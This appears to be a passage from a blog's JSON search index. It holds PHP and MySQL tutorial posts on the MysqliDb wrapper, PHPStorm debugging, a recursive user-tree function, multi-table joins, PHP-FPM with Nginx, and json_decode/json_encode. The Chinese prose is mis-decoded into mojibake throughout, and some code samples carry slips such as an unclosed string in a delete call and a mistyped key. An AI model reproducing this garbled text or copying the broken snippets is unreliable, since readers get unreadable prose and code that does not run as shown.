åŸºç¡€æ“ä½œï¼Œç›¸æ¯”åŸç”Ÿçš„æ–¹å¼ï¼Œåè€…ä½¿ç”¨èµ·æ¥æ›´åŠ æ–¹ä¾¿ã€‚ å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š æ”¯æŒé“¾å¼æ“ä½œ æ”¯æŒMysql å‡½æ•°çš„ä½¿ç”¨ â€¦ å®‰è£…ä½¿ç”¨composer å®‰è£… 1composer require thingengineer&#x2F;mysqli-database-class:dev-master å› ä¸ºMysqliDbæ²¡æœ‰å‘½åç©ºé—´ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦ä½¿ç”¨çš„è¯ï¼Œä¸èƒ½è‡ªåŠ¨åŠ è½½ï¼Œåªèƒ½å…ˆå¼•å…¥ã€‚ 1require &quot;MysqliDb.php&quot;; åˆå§‹åŒ–åˆå§‹åŒ–è¿æ¥æœ‰å‡ ç§æ–¹å¼ï¼š 1. MysqliDb å­—ç¬¦ä¸²1$db &#x3D; new MysqliDb (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;); 2. MysqliDb å¯¹è±¡123456789$db &#x3D; new MysqliDb ([ &#39;host&#39; &#x3D;&gt; &#39;host&#39;, &#39;username&#39; &#x3D;&gt; &#39;username&#39;, &#39;password&#39; &#x3D;&gt; &#39;password&#39;, &#39;db&#39;&#x3D;&gt; &#39;databaseName&#39;, &#39;port&#39; &#x3D;&gt; 3306, &#39;prefix&#39; &#x3D;&gt; &#39;my_&#39;, &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;]); 3. mysqli å¯¹è±¡12$mysqli &#x3D; new mysqli (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);$db &#x3D; new MysqliDb ($mysqli); æ–°å¢å‘user è¡¨ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼š 123456$data &#x3D; [ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;age&quot; &#x3D;&gt; 21, &quot;gender&quot; &#x3D;&gt; &quot;man&quot;];$success &#x3D; $db-&gt;insert(&quot;user&quot;, $data); è¿”å›å€¼ç±»å‹ï¼šbool ä¿®æ”¹ä¿®æ”¹user è¡¨ä¸­çš„ä¸€æ¡è®°å½• 12345$data &#x3D; [ &quot;age&quot; &#x3D;&gt; 22,];$success &#x3D; $db-&gt;where([&quot;name&quot; &#x3D;&gt; &quot;boo&quot;]) -&gt;update(&quot;user&quot;, $data); è¿”å›å€¼ç±»å‹ï¼šbool æŸ¥è¯¢è·å–user è¡¨æ‰€æœ‰æ•°æ®ï¼š1$result &#x3D; $db-&gt;get(&quot;user&quot;, null, &quot;*&quot;); è¿”å›å€¼ï¼šå¤šç»´æ•°ç»„ è·å–user è¡¨å•æ¡æ•°æ®ï¼š1$result &#x3D; $db-&gt;getOne(&quot;user&quot;, &quot;*&quot;); è¿”å›å€¼ï¼šå…³è”æ•°ç»„ è·å–user è¡¨å•ä¸ªå­—æ®µçš„å€¼ï¼š12$result &#x3D; $db-&gt;where(&quot;name&quot;, &quot;boo&quot;) -&gt;getValue(&quot;user&quot;, &quot;*&quot;); è¿”å›å€¼ï¼šstring è·å–æŸ¥è¯¢æ¡æ•°ï¼š1$result &#x3D; $db-&gt;getValue(&quot;user&quot;, &quot;count(*)&quot;); åˆ é™¤åˆ é™¤user è¡¨ä¸­ä¸€æ¡è®°å½• 12$success &#x3D; $db-&gt;where(&quot;user_id&quot;, &quot;boo&quot;) -&gt;delete(&quot;user); è¿è¡ŒåŸç”ŸSQL1$result &#x3D; $db-&gt;rawQuery(&quot;select * from user where name &#x3D; \\&quot;boo\\&quot;&quot;) æ€»ä½“æ¥è¯´ï¼ŒMysqliDb çœŸçš„æŒºå¥½ç”¨çš„ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥æ»¡è¶³æ‰€æœ‰æ—¥å¸¸éœ€æ±‚ã€‚è¿™é‡Œåªæ˜¯åˆ—ä¸¾äº†æœ€åŸºæœ¬çš„CURDï¼Œæ›´å¤šæ“ä½œå¯ä»¥å‚è€ƒå®˜ç½‘æ‰‹å†Œã€‚ å‚è€ƒé“¾æ¥joshcam/mysqli-database-class","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"}]},{"title":"PHPStrom é«˜çº§æŠ€å·§æ•´ç†","slug":"phpstorm-advanced-skills-finishing","date":"2020-10-01T02:39:34.000Z","updated":"2020-10-02T07:25:43.207Z","comments":true,"path":"phpstorm-advanced-skills-finishing/","link":"","permalink":"https://www.0x2beace.com/phpstorm-advanced-skills-finishing/","excerpt":"","text":"PHPStrom æ˜¯æˆ‘æ—¥å¸¸ä½¿ç”¨é¢‘ç‡å¾ˆé«˜çš„ IDEã€‚ åŸºç¡€çš„ä½¿ç”¨è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œè¿™é‡Œä¸»è¦æ˜¯ç”¨æ¥æ•´ç†ä¸€äº›æ¯”è¾ƒé«˜çº§çš„ç”¨æ³•ã€‚ è°ƒè¯•æŠ€å·§è°ƒè¯•æ˜¯æ—¥å¸¸å¼€å‘ä¸­ï¼Œä¸å¯ç¼ºå°‘çš„ä¸€éƒ¨åˆ†ã€‚ è·¯å¾„æ˜ å°„é€šå¸¸éƒ½æ˜¯ç”¨æ¥è°ƒè¯•æœ¬åœ°ä»£ç ï¼Œå¯å¦‚æœéœ€è¦è°ƒè¯•è™šæ‹Ÿæœºæˆ–è€…å…¶ä»–åº”ç”¨ä¸­æ—¶ï¼Œé‚£è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ æ‰“å¼€åå¥½è®¾ç½®æˆ–è€…è®¾ç½®ï¼Œæ‰¾åˆ°ä¸€ä¸ªå·²ç»é…ç½®å¥½çš„æœåŠ¡ï¼Œå‹¾é€‰æ˜ å°„ã€‚ ç„¶åæ‰¾åˆ°è¯¥æœåŠ¡çš„å…¥å£é…ç½®æ–‡ä»¶ï¼Œåé¢çš„æ–‡ä»¶è·¯å¾„å¡«ç»å¯¹è·¯å¾„ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"}]},{"title":"é€’å½’ç®—æ³•","slug":"recursive-algorithm","date":"2020-09-30T12:21:12.000Z","updated":"2020-10-01T02:39:46.124Z","comments":true,"path":"recursive-algorithm/","link":"","permalink":"https://www.0x2beace.com/recursive-algorithm/","excerpt":"æœ€è¿‘åœ¨ä¸šåŠ¡ä¸Šé‡åˆ°ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦æ ¹æ®å·²çŸ¥çš„ä¸€ä¸ªæ•°ä¸€å±‚ä¸€å±‚æŸ¥æ‰¾é™¤æ‰€æœ‰å¯¹åº”ä¸‹çº§ç”¨æˆ·ï¼Œç„¶åå°†ç»“æœæ”¾åœ¨æ•°ç»„ä¸­ã€‚","text":"æœ€è¿‘åœ¨ä¸šåŠ¡ä¸Šé‡åˆ°ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦æ ¹æ®å·²çŸ¥çš„ä¸€ä¸ªæ•°ä¸€å±‚ä¸€å±‚æŸ¥æ‰¾é™¤æ‰€æœ‰å¯¹åº”ä¸‹çº§ç”¨æˆ·ï¼Œç„¶åå°†ç»“æœæ”¾åœ¨æ•°ç»„ä¸­ã€‚ æœ€åè¿”å›çš„ç»“æœå¤§æ¦‚æ˜¯è¿™æ ·ï¼š 1234567891011121314151617181920$result &#x3D; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;php&quot;, &quot;sub_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;python&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ], 1 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;go&quot;, &quot;sup_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;ruby&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ] ] ], ] ]]; è¿™ä¸ªé—®é¢˜çš„éš¾ç‚¹åœ¨äºï¼š æˆ‘å¹¶ä¸çŸ¥é“æœ‰å¤šå°‘ä¸ªä¸‹çº§ ç´¢å¼•æ˜¯æœªçŸ¥çš„ã€‚ å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªæƒ³åˆ°æ˜¯ä½¿ç”¨é€’å½’ç®—æ³•æ¥è§£å†³ã€‚ ä½¿ç”¨é€’å½’ç®—æ³•æ˜¯æ²¡é”™ï¼Œä¸è¿‡æ€è·¯è¿˜æ˜¯æœ‰äº›é—®é¢˜ï¼Œæˆ‘è¯•å›¾é€šè¿‡æ­£å‘æŸ¥æ‰¾ï¼Œç„¶åå°†æ•°æ® push è‡³ç»“æœé›†ã€‚æ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘éœ€è¦çŸ¥é“æ•°ç»„å…·ä½“çš„ç´¢å¼•æ˜¯å¤šå°‘ã€‚ åœ¨ç¬¬ä¸€ä¸ªæ€è·¯æ— è§£ä¹‹åï¼Œæœæ–­æ”¾å¼ƒäº†ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å¾—æ­£å‘æŸ¥æ‰¾ï¼Œé€†å‘å­˜å€¼ã€‚ ä¹Ÿå°±æ˜¯æŠŠé€’å½’è¿”å›çš„ç»“æœå‹å…¥åˆ°å½“å‰ç”¨æˆ·çš„æ•°ç»„ä¸­ï¼Œç„¶åè¿”å›å½“å‰ç”¨æˆ·ï¼Œä»æœ€åä¸€ä¸ªç”¨æˆ·å¾€å‰å¤„ç†ã€‚ æœ€åå®ç°çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213function get_user_tree($user_id)&#123; $result &#x3D; []; &#x2F;&#x2F; todoï¼ˆæ•°æ®æŸ¥è¯¢ï¼‰ &#x2F;&#x2F; éå†æ•°æ® foreach ($data as $item)&#123; $user &#x3D; get_user_tree($item[&#39;user_id&#39;]); $item[&#39;sub_id&#39;] &#x3D; $user; array_push($result, $item); &#125; return $result;&#125; ä¸å¾—ä¸è¯´é€’å½’ç®—æ³•çœŸçš„éå¸¸ä¼˜é›…ï¼Œä»…ä»…ä¸åˆ°åæ¥è¡Œä»£ç å°±æŠŠè¿™ä¸ªå¤æ‚çš„é—®é¢˜ç»™è§£å†³äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Mysql å¤šè¡¨è”æŸ¥","slug":"mysql-multi-table-joint-check","date":"2020-09-24T10:56:22.000Z","updated":"2020-09-24T10:57:00.944Z","comments":true,"path":"mysql-multi-table-joint-check/","link":"","permalink":"https://www.0x2beace.com/mysql-multi-table-joint-check/","excerpt":"Mysql çš„ä¸¤å¼ è¡¨è”è¡¨æŸ¥è¯¢å¯èƒ½å¤§å®¶éƒ½çŸ¥é“æ€ä¹ˆæŸ¥ï¼Œä½†å¦‚æœæ˜¯ä¸‰å¼ è¡¨æˆ–è€…æ˜¯æ›´å¤šå¼ è¡¨å‘¢ï¼Ÿ","text":"Mysql çš„ä¸¤å¼ è¡¨è”è¡¨æŸ¥è¯¢å¯èƒ½å¤§å®¶éƒ½çŸ¥é“æ€ä¹ˆæŸ¥ï¼Œä½†å¦‚æœæ˜¯ä¸‰å¼ è¡¨æˆ–è€…æ˜¯æ›´å¤šå¼ è¡¨å‘¢ï¼Ÿ å…¶å®ä¸ç®¡æ˜¯ä¸¤å¼ è¡¨è¿˜æ˜¯ä¸‰å¼ è¡¨è¿˜æ˜¯N å¼ è¡¨éƒ½æ˜¯ä¸€æ ·çš„ã€‚ å¤šè¡¨è”æŸ¥1234567891011# è¯­æ³•ä¸€ï¼šselect t1.*, t2.*, t3.* from table1 t1, table2 t2, table3 t3where t1.id &#x3D; t2.id and t1.id &#x3D; t3.id;# è¯­æ³•äºŒï¼šselect t1.*, t2.*, t3.* from table t1 inner join table2 t2 on t1.id &#x3D; t2.id inner join table3 t3 on t1.id &#x3D; t3.id; æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š ä¸Šé¢çš„id å¹¶ä¸ä¸€å®šéè¦ä½¿ç”¨idï¼Œå¯ä»¥æ˜¯ä»»ä½•æœ‰å…³è”æ€§çš„å…¶ä»–å­—æ®µ å¦‚æœè¡¨åæ˜¯å…³é”®å­—ï¼Œé‚£ä¹ˆéœ€è¦æŸ¥è¯¢æ—¶åœ¨è¿™ä¸ªå…³é”®å­—ä¸ŠåŠ åå¼•å·ï¼Œå¦‚ï¼š`order` inner join å¯ä»¥æ ¹æ®å®é™…æƒ…å†µå¯ä»¥æ¢æˆleft joinã€right join","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP-FPM ä¸ Nginx æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ","slug":"what-is-the-relationship-between-php-fpm-and-nginx","date":"2020-09-23T14:35:17.000Z","updated":"2020-09-23T14:41:58.011Z","comments":true,"path":"what-is-the-relationship-between-php-fpm-and-nginx/","link":"","permalink":"https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/","excerpt":"æœ€è¿‘éƒ¨ç½²äº†å‡ æ¬¡é¡¹ç›®ï¼Œç»å¸¸é‡åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼šNginx 502 bad gatewayï¼ŒæŸ¥çœ‹ Nginx é”™è¯¯æ—¥å¿—ä¹‹åï¼Œå‘ç°è¿™æ ·ä¸€æ®µè¯ï¼šPrimary script unknownï¼Œæ‰¾äº†å¥½ä¹…çš„ç­”æ¡ˆï¼Œæ€»ç»“å‡ºä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š","text":"æœ€è¿‘éƒ¨ç½²äº†å‡ æ¬¡é¡¹ç›®ï¼Œç»å¸¸é‡åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼šNginx 502 bad gatewayï¼ŒæŸ¥çœ‹ Nginx é”™è¯¯æ—¥å¿—ä¹‹åï¼Œå‘ç°è¿™æ ·ä¸€æ®µè¯ï¼šPrimary script unknownï¼Œæ‰¾äº†å¥½ä¹…çš„ç­”æ¡ˆï¼Œæ€»ç»“å‡ºä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š æœªå¯åŠ¨ Nginx æœªå¯åŠ¨ php-fpm Nginx é…ç½®å¼‚å¸¸ æ–‡ä»¶å¤¹æƒé™ä¸è¶³ å…¶ä¸­æœªå¯åŠ¨ php-fpm æ˜¯å‡ºç°æœ€å¤šçš„é”™è¯¯ï¼Œå†èŠ php-fpm ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥å­¦ä¹ å‡ ä¸ª ç›¸å…³æ¦‚å¿µã€‚ ä»€ä¹ˆæ˜¯ cgiCgi æ˜¯ä¸€ä¸ªåè®®ï¼Œå®ƒçº¦å®šäº† web server å’Œåº”ç”¨ç¨‹åºï¼ˆå¦‚ï¼šPHPã€Pythonç­‰ï¼‰ä¹‹é—´çš„ä¿¡æ¯äº¤æ¢çš„æ ‡å‡†æ ¼å¼ã€‚ é™æ€æ–‡ä»¶å½“ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾è®¿é—®index.htmlè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œé‚£ä¹ˆ web server å°±å›å»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œæœ€åå°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ éé™æ€æ–‡ä»¶å½“ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾è®¿é—®index.phpè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œweb server æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œæ ¹æ®é…ç½®æ–‡ä»¶çŸ¥é“äº†è‡ªå·±å¤„ç†ä¸äº†ï¼Œæ¥ç€è½¬å‘ç»™ç¬¬ä¸‰æ–¹çš„åº”ç”¨ç¨‹åºï¼ˆPHPè§£æå™¨ã€Pythonè§£æå™¨ç­‰ï¼‰ï¼Œweb server çŸ¥é“è¯¥ä¼ å“ªäº›æ•°æ®å—ï¼Ÿå®ƒä¸çŸ¥é“ï¼Œæ‰€ä»¥ Cgi å°±æ˜¯çº¦å®šè¦ä¼ å“ªäº›æ•°æ®ï¼Œä»¥ä»€ä¹ˆæ ·çš„æ ¼å¼ä¼ é€’ç»™ç¬¬ä¸‰æ–¹çš„åº”ç”¨ç¨‹åºçš„åè®®ã€‚ åº”ç”¨ç¨‹åºç‹¬ç«‹å¤„ç†å®Œè¯¥è„šæœ¬ï¼Œç„¶åå†å°†ç»“æœè¿”å›ç»™äº§ç”Ÿå“åº”çš„ web serverï¼Œæœ€åè½¬å‘å“åº”è‡³å®¢æˆ·ç«¯ã€‚ å½“ web server æ”¶åˆ° index.php è¿™ä¸ªè¯·æ±‚ä¹‹åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ cgi ç¨‹åºï¼ˆPHPè§£æå™¨ï¼ŒPythonè§£æå™¨ï¼‰ï¼Œæ¥ä¸‹æ¥è§£æå™¨ä¼šè§£æ php.ini é…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥ cgi è§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ã€‚web server å°†è½¬å‘å“åº”è‡³å®¢æˆ·ç«¯ã€‚ è¿™ç§åè®®çœ‹ä¸Šå»ç®€å•æœ‰æ•ˆï¼Œä½†å®ƒä¹Ÿå­˜åœ¨ä¸€äº›æ˜æ˜¾ä¸è¶³ï¼š æ¯ä¸€ä¸ªè¯·æ±‚äº§ç”Ÿå”¯ä¸€ä¸€ä¸ªè¿›ç¨‹ï¼Œä»ä¸€ä¸ªè¯·æ±‚åˆ°å¦ä¸€ä¸ªè¯·æ±‚ï¼Œå†…å®¹å’Œå…¶ä»–çš„ä¿¡æ¯å…¨éƒ¨ä¸¢å¤±ã€‚ å¼€å¯ä¸€ä¸ªè¿›ç¨‹ä¼šæ¶ˆè€—ç³»ç»Ÿçš„èµ„æºï¼Œå¤§è€Œé‡çš„å¹¶å‘è¯·æ±‚ï¼ˆæ¯äº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼‰æ•°é‡å¾ˆå¿«ä¼šä½¿æœåŠ¡å™¨ä¸€å›¢ç³Ÿã€‚ ä»€ä¹ˆæ˜¯ fastcgiçŸ¥é“äº† cgi æ˜¯åè®®ä¹‹åï¼Œé‚£ fastcgi åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ çŸ¥é“äº† cgi æœåŠ¡å™¨æ€§èƒ½ä½ä¸‹çš„åŸå› æ˜¯å› ä¸ºæ¯äº§ç”Ÿä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šåšåŒæ ·çš„äº‹æƒ…ï¼šè§£æå™¨è§£æé…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œå¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚ fastcgi åˆ™æ˜¯åœ¨ cgi çš„åŸºç¡€ä¸Šåšäº†é‡å¤§çš„æ”¹è¿›ï¼Œä»è€Œè¾¾åˆ°ç›¸åŒçš„ç›®çš„ï¼ŒåŸç†å¦‚ä¸‹ï¼š fgstcgi ä½¿ç”¨äº†èƒ½å¤Ÿå¤„ç†å¤šä¸ªè¯·æ±‚çš„æŒç»­è¿›ç¨‹ï¼Œè€Œä¸æ˜¯é’ˆå¯¹æ¯ä¸ªè¯·æ±‚éƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚ fastcgi æ˜¯ä¸€ä¸ªåŸºäºå¥—æ¥å­—çš„åè®®ï¼Œå› æ­¤å®ƒèƒ½å¤Ÿé€‚ç”¨äºä»»åŠ¡å¹³å°ï¼ˆweb serverï¼‰åŠä»»ä½•ç¼–ç¨‹è¯­è¨€ã€‚ fastcgi çš„æ€§èƒ½ä¹‹æ‰€ä»¥é«˜äº cgiï¼Œæ˜¯å› ä¸º fastcgi å¯ä»¥å¯¹è¿›ç¨‹è¿›è¡Œç®¡ç†ï¼Œè€Œè¿™æ˜¯ cgi æ‰€åšä¸åˆ°çš„ï¼Œä½†å®ƒçš„æœ¬è´¨ä»ç„¶æ˜¯ åè®®ã€‚ ä»€ä¹ˆæ˜¯ php-fpmé»˜è®¤æƒ…å†µä¸‹ï¼ŒPHP æ˜¯æ”¯æŒ cgi å’Œ fastcgi åè®®çš„ã€‚ PHP äºŒè¿›åˆ¶å‘½ä»¤èƒ½å¤Ÿå¤„ç†è„šæœ¬å¹¶ä¸”èƒ½å¤Ÿé€šè¿‡å¥—æ¥å­—ä¸Nginx äº¤äº’ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å¹¶ä¸æ˜¯æ•ˆç‡æœ€é«˜çš„ï¼Œphp-fpm ä¾¿æ˜¯åœ¨è¿™æ ·çš„èƒŒæ™¯ä¸‹è¯ç”Ÿçš„ã€‚ PHP-FPM ï¼ˆPHP FastCgi è¿›ç¨‹ç®¡ç†ï¼ŒPHP Fastcgi Process Managerï¼‰ php-fpm å°† fastcgi å¸¦åˆ°äº†ä¸€ä¸ªå…¨æ–°çš„æ°´å¹³ã€‚ php-fpm å’Œ nginx æœ‰ä»€ä¹ˆè”ç³»åœ¨ç†è§£äº† cgiã€fastcgiã€php-fpm æ˜¯ä»€ä¹ˆä¹‹åï¼Œå°±ä¸éš¾ç†è§£ php-fpm å’Œnginxæ˜¯ä»€ä¹ˆå…³ç³»äº†ã€‚ å› ä¸º php-fpm æ˜¯ php fastcgi çš„è¿›ç¨‹ç®¡ç†å™¨ï¼Œæ‰€ä»¥ php-fpm å°±æ˜¯ nginx ä¸ php äº¤äº’æ—¶ï¼ŒååŠ© php å°†æ€§èƒ½å‘æŒ¥æœ€å¤§çš„ä¸€ä¸ªç¨‹åºã€‚ éš¾æ€ªæ¯æ¬¡ php-fpm è¿™ä¸ªè¿›ç¨‹æ­»æ‰æ—¶ï¼Œnginx çš„çŠ¶æ€å°±å˜æˆäº† 502 ã€‚ å‚è€ƒé“¾æ¥ æä¸æ¸… Fastcgi å’Œ cgi å…³ç³»","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"å¦‚ä½•å°† JSON å¯¹è±¡è½¬æ¢æˆ PHP æ•°ç»„","slug":"how-to-convert-a-json-object-into-a-php-array","date":"2020-09-22T14:58:35.000Z","updated":"2020-09-22T15:00:32.495Z","comments":true,"path":"how-to-convert-a-json-object-into-a-php-array/","link":"","permalink":"https://www.0x2beace.com/how-to-convert-a-json-object-into-a-php-array/","excerpt":"åœ¨ä»‹ç»å¦‚ä½•å°†JSON å­—ç¬¦ä¸²è½¬ä¼ ä¸ºPHP æ•°ç»„ä¹‹å‰ï¼Œå…ˆæ¥å¤ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯JSONã€‚","text":"åœ¨ä»‹ç»å¦‚ä½•å°†JSON å­—ç¬¦ä¸²è½¬ä¼ ä¸ºPHP æ•°ç»„ä¹‹å‰ï¼Œå…ˆæ¥å¤ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯JSONã€‚ JSONé€šä¿—ä¸€ç‚¹è®²JSON å°±æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå°±æ˜¯ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œåªä¸è¿‡å…ƒç´ ä¼šé€šè¿‡ç‰¹å®šçš„ç¬¦å·æ ‡æ³¨ã€‚ {}ï¼šå¤§æ‹¬å·è¡¨ç¤ºå¯¹è±¡ []ï¼šä¸­æ‹¬å·è¡¨ç¤ºæ•°ç»„ &quot;&quot;ï¼šåŒå¼•å·å†…æ˜¯å±æ€§æˆ–å€¼ æ ‡å‡†çš„JSON å¯¹è±¡ï¼š 123456# è¿™æ˜¯ä¸€ä¸ªJSON å¯¹è±¡&#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25&#125; æ ‡å‡†çš„JSON æ•°ç»„ï¼š 123456789101112131415161718# è¿™æ˜¯ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªå¯¹è±¡çš„JSON æ•°ç»„[ &#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25 &#125;, &#123; &quot;name&quot;: &quot;max&quot;, &quot;gender&quot;: &quot;men&quot;,, &quot;age&quot;: 29 &#125;]# è¿™æ˜¯ä¸€ä¸ªåŒ…å«æ•°ç»„çš„JSON å¯¹è±¡&#123; &quot;name&quot;:[&quot;Michael&quot;,&quot;Jerry&quot;]&#125; åœ¨ç†Ÿæ‚‰äº†å‡ ç§å¸¸è§çš„JSON å­—ç¬¦ä¸²ä¹‹åï¼Œåœ¨æ¥çœ‹ä¸€ä¸‹å¦‚ä½•è§£æJSON å­—ç¬¦ä¸²ã€‚ json_decodeJSON å¯¹è±¡è½¬æ¢ä¸ºå¯¹è±¡ 123456789101112131415161718&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$obj &#x3D; json_decode($jsonObj);print $obj-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;boo$jsonObj2 &#x3D; &#39;[&#123;&quot;name&quot;: &quot;boo&quot;&#125;]&#39;;$obj2 &#x3D; json_decode($jsonObj2);print $obj[0]-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;booobject(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)array (size&#x3D;1) 0 &#x3D;&gt; object(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) JSON å¯¹è±¡è½¬æ¢ä¸ºæ•°ç»„ 12345678&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$arr &#x3D; json_decode($jsonObj, true);print $arr[&#39;name&#39;]; &#x2F;&#x2F;booarray (size&#x3D;1) &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) éœ€è¦æ³¨æ„å‡ ä¸ªå®¹æ˜“å‡ºé”™çš„ç»†èŠ‚ï¼š 123456789101112&lt;?php&#x2F;&#x2F; å¤§æ‹¬å·å¤–éœ€è¦ä½¿ç”¨å•å¼•å·$bad_json &#x3D; &quot;&#123; &#39;bar&#39;: &#39;baz&#39; &#125;&quot;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; å±æ€§éœ€è¦ä½¿ç”¨åŒå¼•å·å¼•èµ·æ¥$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot; &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; ä¸å…è®¸å°¾éšé€—å·$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot;, &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null json_encodeä¸‹é¢æ¥çœ‹çœ‹å¦‚ä½•è¿”å›JSON æ ¼å¼çš„æ•°æ®ï¼Œé€šè¿‡ä½¿ç”¨ json_encodeè¿™ä¸ªå‡½æ•°ï¼š 123456789101112131415161718192021222324252627$b &#x3D; array();echo &quot;ç©ºæ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡º: &quot;, json_encode($b), &quot;\\n&quot;; &#x2F;&#x2F;ç©ºæ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡ºï¼š[]echo &quot;ç©ºæ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($b, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;ç©ºæ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&#125;$c &#x3D; array(array(1,2,3));echo &quot;å¤šç»´æ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡º: &quot;, json_encode($c), &quot;\\n&quot;; &#x2F;&#x2F;å¤šç»´æ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡ºï¼š[[1,2,3]]echo 